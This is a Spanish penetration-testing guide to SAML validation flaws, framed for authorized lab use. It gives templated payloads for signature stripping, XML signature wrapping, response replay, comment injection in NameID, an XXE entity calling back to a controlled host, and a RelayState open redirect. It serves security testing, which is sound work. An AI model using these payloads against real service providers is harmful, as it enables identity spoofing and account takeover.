# 🗡️ Fallos de validación SAML: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. Firma alterada

**Objetivo:** Cambiar un NameID de una respuesta SAML propia sin rehacer XML Signature.

```xml
<saml:NameID>{EMAIL_PROPIO_MODIFICADO}</saml:NameID>
```

**Interpretación:** La respuesta debe rechazarse. Hacer el cambio dentro de una SAMLResponse válida propia y comparar con original.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SAML%20Injection/README.md).

### 2. Signature stripping

**Objetivo:** Quitar Signature de una respuesta propia y verificar que el SP la rechace.

```xml
<samlp:Response ID="{RESPONSE_ID_PROPIO}" Destination="{ACS_PROPIA}">
  <saml:Assertion ID="{ASSERTION_ID_PROPIO}">
    <saml:Subject><saml:NameID>{EMAIL_PROPIO}</saml:NameID></saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

**Interpretación:** Es un esquema de laboratorio: conservar Issuer, Audience, Conditions y demás campos requeridos del mensaje real.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SAML%20Injection/README.md).

### 3. Wrapping de assertion

**Objetivo:** En laboratorio, duplicar la assertion: una firmada propia y otra no firmada con otra identidad controlada.

```xml
<samlp:Response>
  <saml:Assertion ID="{ID_FORJADA}">
    <saml:Subject><saml:NameID>{EMAIL_CUENTA_B_PROPIA}</saml:NameID></saml:Subject>
  </saml:Assertion>
  <saml:Assertion ID="{ID_FIRMADA}">
    <ds:Signature><ds:SignedInfo><ds:Reference URI="#{ID_FIRMADA}"/></ds:SignedInfo></ds:Signature>
    <saml:Subject><saml:NameID>{EMAIL_CUENTA_A_PROPIA}</saml:NameID></saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

**Interpretación:** El bloque muestra la disposición XSW, no una firma válida completa. Partir de respuesta real y verificar qué assertion se consume.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SAML%20Injection/README.md).

### 4. Replay de respuesta

**Objetivo:** Reenviar una SAMLResponse ya consumida por la misma cuenta propia.

```http
POST /saml/acs HTTP/1.1
Host: {SP_EN_ALCANCE}
Content-Type: application/x-www-form-urlencoded

SAMLResponse={RESPUESTA_PROPIA_YA_USADA}&RelayState={RELAY_PROPIO}
```

**Interpretación:** Comprobar si InResponseTo y el ID ya consumido impiden crear nueva sesión; no inferir bypass por una redirección.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SAML%20Injection/README.md).

### 5. Audience y Destination

**Objetivo:** Alterar un campo por vez en una respuesta propia firmada por un IdP de laboratorio.

```xml
<saml:Audience>{SP_NO_DESTINATARIO_DE_LAB}</saml:Audience>
<samlp:Response Destination="{ACS_NO_REGISTRADA_DE_LAB}">...</samlp:Response>
```

**Interpretación:** Si se modifica una respuesta ya firmada, el rechazo puede deberse a firma inválida; generar una nueva firma de lab para aislar el control.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SAML%20Injection/README.md).

### 6. Comentario XML en NameID

**Objetivo:** Evaluar diferencias de parser en un IdP/SP de laboratorio con dos cuentas propias.

```xml
<saml:NameID>usuario<!--prueba-->@{DOMINIO_DE_LAB}</saml:NameID>
```

**Interpretación:** La técnica depende de normalización de texto XML y biblioteca. Confirmar identidad de la sesión creada, no solo texto reflejado.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SAML%20Injection/README.md).

### 7. Entidad XML externa en parser SAML

**Objetivo:** Verificar si una entidad provoca callback a un dominio de prueba, sin solicitar archivos.

```xml
<!DOCTYPE r [<!ENTITY prueba SYSTEM "https://{CONTROLLED_HOST}/saml-canary">]>
<samlp:Response>...&prueba;...</samlp:Response>
```

**Interpretación:** Muchos parsers rechazan DTD antes de verificar SAML. Una callback prueba XXE, no suplantación de identidad.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SAML%20Injection/README.md).

### 8. InResponseTo de otra solicitud

**Objetivo:** En SP e IdP de laboratorio, ligar una respuesta firmada a un AuthnRequest distinto.

```xml
<samlp:Response InResponseTo="{AUTHN_REQUEST_A}" Destination="{ACS_PROPIA}">
  <saml:Assertion ID="{ASSERTION_FIRMADA_B}">...</saml:Assertion>
</samlp:Response>
```

**Interpretación:** Generar y firmar la respuesta con IdP propio; alterar XML ya firmado solo prueba rechazo criptográfico.

**Fuente técnica:** [documentación de la técnica](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html).

### 9. Condiciones temporales

**Objetivo:** Emitir en laboratorio una assertion propia firmada con NotOnOrAfter anterior al momento actual.

```xml
<saml:Conditions NotBefore="{FECHA_PASADA}" NotOnOrAfter="{FECHA_YA_VENCIDA}">
  <saml:AudienceRestriction><saml:Audience>{ENTITY_ID_SP}</saml:Audience></saml:AudienceRestriction>
</saml:Conditions>
```

**Interpretación:** El SP debe rechazar la assertion vencida; conservar firma válida y comparar contra una ventana vigente.

**Fuente técnica:** [documentación de la técnica](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html).

### 10. RelayState como redirección

**Objetivo:** Con respuesta válida propia, cambiar solo RelayState por una URL controlada.

```http
POST /saml/acs HTTP/1.1
Host: {SP_EN_ALCANCE}
Content-Type: application/x-www-form-urlencoded

SAMLResponse={RESPUESTA_PROPIA_VALIDA}&RelayState=https%3A%2F%2F{CONTROLLED_HOST}%2Freturn
```

**Interpretación:** Si el SP redirige fuera de su lista permitida, reportar open redirect en flujo SAML; no implica por sí solo bypass de firma.

**Fuente técnica:** [documentación de la técnica](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
